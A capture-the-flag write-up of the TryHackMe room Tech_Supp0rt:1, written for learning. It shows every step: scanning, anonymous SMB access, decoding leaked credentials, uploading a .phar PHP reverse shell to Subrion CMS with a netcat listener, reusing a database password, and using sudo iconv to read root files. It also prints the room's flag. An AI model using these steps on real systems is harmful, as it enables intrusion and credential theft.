# CTF Write-Up: [Tech_Supp0rt:1](https://tryhackme.com/room/tech_supp0rt1)

> **Platform:** TryHackMe | **Difficulty:** Easy 

---

## 🚩 Flags

<details>
<summary>Root Flag</summary>

`851b8233a8c09400ec30651bd1529bf1ed02790b`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```bash
nmap -vv -oN Nmap/Initial <IP_ADDRESS>
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

### Detailed Nmap Scan

```bash
nmap -vv -oN Nmap/Detailed -p 22,80,139,445 -A <IP_ADDRESS>
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 |
| 80 | HTTP | Apache httpd 2.4.18 (Ubuntu) |
| 139 | NetBIOS | Samba smbd 3.X - 4.X |
| 445 | SMB | Samba smbd 4.3.11-Ubuntu |

### Web Enumeration (Gobuster)

```bash
gobuster dir -u http://<IP_ADDRESS>/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

```
/wordpress    (Status: 301)
/test         (Status: 301)  ← fake Microsoft phishing page
```

`/test/` turned out to be a hosted tech-support scam page impersonating Windows Defender — consistent with the room's theme. WordPress 5.7.2 was confirmed running at `/wordpress/` via Wappalyzer and WPScan, which also enumerated one valid user: `support`.

### SMB Enumeration

Initial SMB connections timed out. Specifying the protocol version explicitly resolved the issue:

```bash
smbclient -L //<IP_ADDRESS>/ -N --option='client min protocol=NT1'
```

```
Sharename    Type    Comment
---------    ----    -------
print$       Disk    Printer Drivers
websvr       Disk
IPC$         IPC     IPC Service
```

The `websvr` share was accessible anonymously and contained a single file:

```bash
smbclient //<IP_ADDRESS>/websvr -N --option='client min protocol=NT1' --option='socket options=TCP_NODELAY'
smb: \> get enter.txt
```

---

## 2. Credential Discovery 

Contents of `enter.txt`:

```
GOALS
=====
1) Make fake popup and host it online on Digital Ocean server
2) Fix subrion site, /subrion doesn't work, edit from panel
3) Edit wordpress website

IMP
===
Subrion creds
|-> admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
```

The note references a "magical formula", which is linked to a CyberChef recipe chaining Base58 → Base32 → Base64 decoding:

[🔗 CyberChef Recipe](https://cyberchef.io/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true)From_Base32('A-Z2-7%3D',true)From_Base64('A-Za-z0-9%2B/%3D',true)&input=N3NLdm50WGRQRUpheGF6Y2U5UFhpMjR6YUZyTGlLV0Nr)

```
7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
    └─► Base58 → KUZE42DCKREXOTLKIU6Q====
    └─► Base32 → U2NhbTIwMjE=
    └─► Base64 → Scam2021
```

**Recovered credentials:** `admin:Scam2021` for the Subrion CMS panel.

---

## 3. Initial Access — Subrion CMS File Upload RCE

Navigating to `http://<IP_ADDRESS>/subrion/panel/` and logging in with `admin:Scam2021` gave full admin access to Subrion CMS. The file manager allows uploading `.phar` files, which Apache executes as PHP — a known bypass for the extension filter.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.phar
# Edit: $ip = 'tun0'; $port = 4444;
```

The file was uploaded via **Content → Uploads**, then triggered:

```bash
# Start listener
nc -lvnp 4444

# Trigger the shell
curl http://<IP_ADDRESS>/subrion/uploads/shell.phar
```

Shell stabilised with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

✅ Shell as `www-data`.

---

## 4. Lateral Movement — www-data → scamsite

`wp-config.php` revealed database credentials:

```bash
cat /var/www/html/wordpress/wp-config.php | grep -E "DB_USER|DB_PASSWORD|DB_NAME"
```

```
define( 'DB_NAME',     'wpdb' );
define( 'DB_USER',     'support' );
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
```

The only home directory on the box belonged to `scamsite`. The database password was reused as the system user password:

```bash
su scamsite
# Password: ImAScammerLOL!123!
```

---

## 5. Privilege Escalation — sudo iconv

```bash
sudo -l
```

```
User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

`iconv` performs character encoding conversion and can read arbitrary files as root. Used directly to exfiltrate the root flag:

```bash
sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
```

---

## 6. Root Flag

> 🚩 Root flag: `851b8233a8c09400ec30651bd1529bf1ed02790b`

---

## 7. Attack Chain

```
Nmap Scan
    └─► Port 22 (SSH), Port 80 (HTTP/Apache), Port 139/445 (SMB)

Gobuster on /
    └─► /wordpress (WordPress 5.7.2), /test (phishing page)

SMB Anonymous Access
    └─► websvr share → enter.txt → encoded Subrion credentials

CyberChef Decode (Base58 → Base32 → Base64)
    └─► 7sKvntXdPEJaxazce9PXi24zaFrLiKWCk → Scam2021

Subrion Panel Login (admin:Scam2021)
    └─► .phar upload bypass → RCE as www-data

wp-config.php Credential Harvesting
    └─► ImAScammerLOL!123! → su scamsite

sudo iconv Abuse
    └─► NOPASSWD iconv → arbitrary file read as root → root.txt
```

---

## 8. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---------------|--------|------------|
| 1 | SMB share anonymously readable | Credentials leaked via `enter.txt` | Disable anonymous SMB access; remove sensitive files from shares |
| 2 | Credentials obfuscated not encrypted | Encoding trivially reversed | Never store credentials in files; use a secrets manager |
| 3 | Subrion `.phar` upload bypass | RCE as `www-data` | Validate file magic bytes; block PHP-executable extensions server-side |
| 4 | WordPress DB password reused as system password | Lateral movement to `scamsite` | Use unique passwords per service and system account |
| 5 | `iconv` granted passwordless sudo | Arbitrary file read as root | Remove unnecessary sudo rules; apply principle of least privilege |

---

*Tech_Supp0rt: 1 — TryHackMe | Rooted ✅*
